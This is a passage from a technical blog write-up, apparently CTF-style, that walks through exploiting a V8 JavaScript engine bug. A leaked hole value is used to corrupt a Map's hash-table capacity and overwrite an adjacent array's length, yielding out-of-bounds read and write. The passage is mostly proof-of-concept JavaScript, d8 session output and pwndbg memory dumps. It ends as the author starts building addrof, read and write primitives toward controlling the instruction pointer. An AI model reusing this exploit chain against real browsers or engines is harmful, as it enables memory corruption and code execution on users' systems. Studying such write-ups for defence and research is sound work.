</span></span><span style="display:flex;"><span> - deleted: 0
</span></span><span style="display:flex;"><span> - buckets: 8
</span></span><span style="display:flex;"><span> - capacity: 16
</span></span><span style="display:flex;"><span> - buckets: {
</span></span><span style="display:flex;"><span>              0: -1
</span></span><span style="display:flex;"><span>              1: -1
</span></span><span style="display:flex;"><span>              2: 0x2b4f000023e1 &lt;undefined&gt;
</span></span><span style="display:flex;"><span>              3: 0x2b4f000023e1 &lt;undefined&gt;
</span></span><span style="display:flex;"><span>              4: 0x2b4f000023e1 &lt;undefined&gt;
</span></span><span style="display:flex;"><span>              5: 0x2b4f000023e1 &lt;undefined&gt;
</span></span><span style="display:flex;"><span>              6: 0x2b4f000023e1 &lt;undefined&gt;
</span></span><span style="display:flex;"><span>              7: 0x2b4f000023e1 &lt;undefined&gt;
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span> - elements: {
</span></span><span style="display:flex;"><span> }
</span></span></code></pre></td></tr></table>
</div>
</div><p>Voila, we have successfully overwritten the map&rsquo;s capacity, and because of that, the buckets got extended, and the elements&rsquo; location will be shifted as well.</p>
<p>That means, by corrupting the map size to <code>-1</code>, due to the corrupted <code>capacity</code> value after the first <code>map.set</code> call (after the size is -1), when the <code>map.set</code> method got called for the second time, it will store the <code>map</code> entry (<code>key</code>, <code>value</code>, <code>next_ptr</code>) in the outside of the <code>map</code> (OOB write to the objects below the <code>map</code> object).</p>
<p>Let&rsquo;s try to prove it by modifying our <code>poc.js</code> file to:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">var</span> c <span style="color:#555">=</span> [];
</span></span><span style="display:flex;"><span>m <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> Map();
</span></span><span style="display:flex;"><span>m.set(<span style="color:#f60">1</span>, <span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>m.set(c.hole(), <span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>m.<span style="color:#069;font-weight:bold">delete</span>(c.hole());
</span></span><span style="display:flex;"><span>m.<span style="color:#069;font-weight:bold">delete</span>(c.hole());
</span></span><span style="display:flex;"><span>m.<span style="color:#069;font-weight:bold">delete</span>(<span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>oob_arr <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> <span style="color:#366">Array</span>(<span style="color:#f60">1.1</span>, <span style="color:#f60">2.2</span>);
</span></span></code></pre></td></tr></table>
</div>
</div><p>Below is the <code>oob_arr</code> address retrieved from the <code>%DebugPrint</code>:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>d8&gt; %DebugPrint(m)
</span></span><span style="display:flex;"><span>DebugPrint: 0x1d9d0028756d: [JSMap]
</span></span><span style="display:flex;"><span>- map: 0x1d9d001862f1 &lt;Map[16](HOLEY_ELEMENTS)&gt; [FastProperties]
</span></span><span style="display:flex;"><span>- prototype: 0x1d9d00186431 &lt;Object map = 0x1d9d00186319&gt;
</span></span><span style="display:flex;"><span>- elements: 0x1d9d00002259 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
</span></span><span style="display:flex;"><span>- table: 0x1d9d0028764d &lt;OrderedHashMap[17]&gt;
</span></span><span style="display:flex;"><span>- properties: 0x1d9d00002259 &lt;FixedArray[0]&gt;
</span></span><span style="display:flex;"><span>- All own properties (excluding elements): {}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>d8&gt; %DebugPrint(oob_arr)
</span></span><span style="display:flex;"><span>DebugPrint: 0x1d9d00287699: [JSArray]
</span></span><span style="display:flex;"><span>- map: 0x1d9d0018e6bd &lt;Map[16](PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]
</span></span><span style="display:flex;"><span>- prototype: 0x1d9d0018e11d &lt;JSArray[0]&gt;
</span></span><span style="display:flex;"><span>- elements: 0x1d9d002876b1 &lt;FixedDoubleArray[2]&gt; [PACKED_DOUBLE_ELEMENTS]
</span></span><span style="display:flex;"><span>- length: 2
</span></span><span style="display:flex;"><span>- properties: 0x1d9d00002259 &lt;FixedArray[0]&gt;
</span></span><span style="display:flex;"><span>- All own properties (excluding elements): {
</span></span><span style="display:flex;"><span>   0x1d9d00006551: [String] in ReadOnlySpace: #length: 0x1d9d00144255 &lt;AccessorInfo name= 0x1d9d00006551 &lt;String[6]: #length&gt;, data= 0x1d9d000023e1 &lt;undefined&gt;&gt; (const accessor descriptor), location: descriptor
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>- elements: 0x1d9d002876b1 &lt;FixedDoubleArray[2]&gt; {
</span></span><span style="display:flex;"><span>          0: 1.1
</span></span><span style="display:flex;"><span>          1: 2.2
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s examine it in <code>gdb</code>:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>pwndbg&gt; x/30wx 0x1d9d0028764d-1
</span></span><span style="display:flex;"><span>0x1d9d0028764c:	0x00002c29	0x00000022	0xfffffffe	0x00000000
</span></span><span style="display:flex;"><span>0x1d9d0028765c:	0x00000004	0xfffffffe	0xfffffffe	0x000023e1
</span></span><span style="display:flex;"><span>0x1d9d0028766c:	0x000023e1	0x000023e1	0x000023e1	0x000023e1
</span></span><span style="display:flex;"><span>0x1d9d0028767c:	0x000023e1	0x000023e1	0x000023e1	0x000023e1
</span></span><span style="display:flex;"><span>0x1d9d0028768c:	0x000023e1	0x000023e1	0x000023e1	0x0018e6bd
</span></span><span style="display:flex;"><span>0x1d9d0028769c:	0x00002259	0x002876b1	0x00000004	0x00007779
</span></span><span style="display:flex;"><span>0x1d9d002876ac:	0x0019a879	0x00002ac1	0x00000004	0x9999999a
</span></span><span style="display:flex;"><span>0x1d9d002876bc:	0x3ff19999	0x9999999a
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notice that:</p>
<ul>
<li><code>oob_arr</code> is placed next to the <code>table</code> object (<code>oob_arr = table+0x4c = 0x1d9d0028764c+0x4c = 0x1d9d00287698</code>).</li>
<li><code>oob_arr</code> elements pointer is stored in <code>oob_arr+0x8 = table+0x54</code>.</li>
<li><code>oob_arr</code> length is stored in <code>oob_arr + 0xc = table+0x58</code>.</li>
</ul>
<p>Now, what happens if we corrupt the map <code>capacity</code> by calling <code>m.set(0x10, -1)</code>?</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>d8&gt; m.set(0x10, -1)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>... # Back to GDB
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pwndbg&gt; x/30wx 0x1d9d0028764d-1
</span></span><span style="display:flex;"><span>0x1d9d0028764c:	0x00002c29	0x00000022	0x00000000	0x00000000
</span></span><span style="display:flex;"><span>0x1d9d0028765c:	0x00000020	0xfffffffe	0xfffffffe	0x000023e1
</span></span><span style="display:flex;"><span>0x1d9d0028766c:	0x000023e1	0x000023e1	0x000023e1	0x000023e1
</span></span><span style="display:flex;"><span>0x1d9d0028767c:	0x000023e1	0x000023e1	0x000023e1	0x000023e1
</span></span><span style="display:flex;"><span>0x1d9d0028768c:	0x000023e1	0x000023e1	0x000023e1	0x0018e6bd
</span></span><span style="display:flex;"><span>0x1d9d0028769c:	0x00002259	0x002876b1	0x00000004	0x00007779
</span></span><span style="display:flex;"><span>0x1d9d002876ac:	0x0019a879	0x00002ac1	0x00000004	0x9999999a
</span></span><span style="display:flex;"><span>0x1d9d002876bc:	0x3ff19999	0x9999999a
</span></span><span style="display:flex;"><span>pwndbg&gt; job 0x1d9d0028764d
</span></span><span style="display:flex;"><span>0x1d9d0028764d: [OrderedHashMap]
</span></span><span style="display:flex;"><span> - FixedArray length: 17
</span></span><span style="display:flex;"><span> - elements: 0
</span></span><span style="display:flex;"><span> - deleted: 0
</span></span><span style="display:flex;"><span> - buckets: 16
</span></span><span style="display:flex;"><span> - capacity: 32
</span></span><span style="display:flex;"><span> - buckets: {
</span></span><span style="display:flex;"><span>              0: -1
</span></span><span style="display:flex;"><span>              1: -1
</span></span><span style="display:flex;"><span>              2: 0x1d9d000023e1 &lt;undefined&gt;
</span></span><span style="display:flex;"><span>              3: 0x1d9d000023e1 &lt;undefined&gt;
</span></span><span style="display:flex;"><span>              4: 0x1d9d000023e1 &lt;undefined&gt;
</span></span><span style="display:flex;"><span>              5: 0x1d9d000023e1 &lt;undefined&gt;
</span></span><span style="display:flex;"><span>              6: 0x1d9d000023e1 &lt;undefined&gt;
</span></span><span style="display:flex;"><span>              7: 0x1d9d000023e1 &lt;undefined&gt;
</span></span><span style="display:flex;"><span>              8: 0x1d9d000023e1 &lt;undefined&gt;
</span></span><span style="display:flex;"><span>              9: 0x1d9d000023e1 &lt;undefined&gt;
</span></span><span style="display:flex;"><span>             10: 0x1d9d000023e1 &lt;undefined&gt;
</span></span><span style="display:flex;"><span>             11: 0x1d9d000023e1 &lt;undefined&gt;
</span></span><span style="display:flex;"><span>             12: 0x1d9d000023e1 &lt;undefined&gt;
</span></span><span style="display:flex;"><span>             13: 0x1d9d000023e1 &lt;undefined&gt;
</span></span><span style="display:flex;"><span>             14: 0x1d9d0018e6bd &lt;Map[16](PACKED_DOUBLE_ELEMENTS)&gt;
</span></span><span style="display:flex;"><span>             15: 0x1d9d00002259 &lt;FixedArray[0]&gt;
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span> - elements: {
</span></span><span style="display:flex;"><span> }
</span></span></code></pre></td></tr></table>
</div>
</div><p>The impact is map&rsquo;s capacity is overwritten to <code>32</code>, which means the buckets got extended from <code>2</code> to <code>16</code>. The elements pointer is shifted, by <code>(16-2)*0x4 = 0x38</code> due to the extension of the buckets. So previously, the first element of the map&rsquo;s key was stored in <code>table+0x1c</code>, now it will be stored in <code>table+0x54</code>. The first element&rsquo;s value was stored in <code>table+0x20</code> previously, now after the corruption, it will be stored in <code>table+0x58</code>.</p>
<p>Remember that <code>table+0x54</code> is the <code>oob_arr</code> elements stored pointer, and <code>table+0x58</code> is the <code>oob_arr</code> length. So, after the corruption, if we call <code>map.set</code> for the third time, it will overwrite the <code>oob_arr</code> elements pointer and length. And with further techniques, we will be able to use the corrupted <code>oob_arr</code> as our read-and-write primitives.</p>
<p>Let&rsquo;s validate this by trying to do the third call of <code>map.set</code>.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>d8&gt; m.set(oob_arr, 0xffff);
</span></span><span style="display:flex;"><span>d8&gt; oob_arr.length
</span></span><span style="display:flex;"><span>65535
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>... # Back to gdb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pwndbg&gt; x/30wx 0x1d9d0028764d-1+0x4c
</span></span><span style="display:flex;"><span>0x1d9d00287698:	0x0018e6bd	0x0016a2e8	0x00287699	0x0001fffe
</span></span><span style="display:flex;"><span>0x1d9d002876a8:	0x000023e1	0x0019a879	0x00002ac1	0x00000004
</span></span><span style="display:flex;"><span>0x1d9d002876b8:	0x9999999a	0x3ff19999	0x9999999a	0x40019999
</span></span><span style="display:flex;"><span>0x1d9d002876c8:	0x000025d5	0x3ec011c6	0x00000004	0x29386428
</span></span><span style="display:flex;"><span>0x1d9d002876d8:	0x000025d5	0x8f31397e	0x00000014	0x62654425
</span></span><span style="display:flex;"><span>0x1d9d002876e8:	0x72506775	0x28746e69	0x5f626f6f	0x29727261
</span></span><span style="display:flex;"><span>0x1d9d002876f8:	0x00002231	0x00000004	0xe3e5e7e0	0x002876c9
</span></span><span style="display:flex;"><span>0x1d9d00287708:	0x00003039	0x00000004
</span></span></code></pre></td></tr></table>
</div>
</div><p>As you can see, the oob_arr length is now <code>65535</code>, and the elements are pointing to itself (<code>0x00287699</code> is the lower 32-bit of <code>oob_arr</code> itself). For the last validation check, let&rsquo;s try to access some of the <code>oob_arr</code> elements</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>d8&gt; oob_arr[0]
</span></span><span style="display:flex;"><span>2.78129989631982e-309
</span></span><span style="display:flex;"><span>d8&gt; oob_arr[1]
</span></span><span style="display:flex;"><span>3.5681974603905814e-308
</span></span><span style="display:flex;"><span>d8&gt; oob_arr[2]
</span></span><span style="display:flex;"><span>8.4879885714e-314
</span></span><span style="display:flex;"><span>d8&gt; oob_arr[3]
</span></span><span style="display:flex;"><span>1.1
</span></span><span style="display:flex;"><span>d8&gt; oob_arr[4]
</span></span><span style="display:flex;"><span>2.2
</span></span></code></pre></td></tr></table>
</div>
</div><p>That&rsquo;s the correct behavior. Because we overwrote the <code>oob_arr</code> elements pointer to point to itself, the <code>oob_arr[0]</code> will return the value of <code>elements_ptr+0x8</code>, which is now equivalent to <code>oob_arr+0x8</code>.</p>
<p>Now that we can trigger OOB read-and-write, let&rsquo;s move to the next step</p>
<h3 id="preparing-primitives">Preparing primitives <a href="#preparing-primitives" class="anchor">#</a></h3>
<p>Now that we have an array that can do OOB read and write, to control the RIP, we need to be able to perform:</p>
<ul>
<li><code>addrof</code>: Get the address of an object.</li>
<li><code>read</code>  : Read the value of the given address.</li>
<li><code>write</code> : Write a value to the given address.</li>
</ul>
<h4 id="creating-helpers">Creating helpers <a href="#creating-helpers" class="anchor">#</a></h4>
<p>To make our life easier, we need to define some helpers to easily convert from floating point to hex and vice-versa (Notice that everytime we access <code>oob_arr</code> elements, the returned value is in form of floating-point). Helpers are taken from Faraz&rsquo;s blog.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
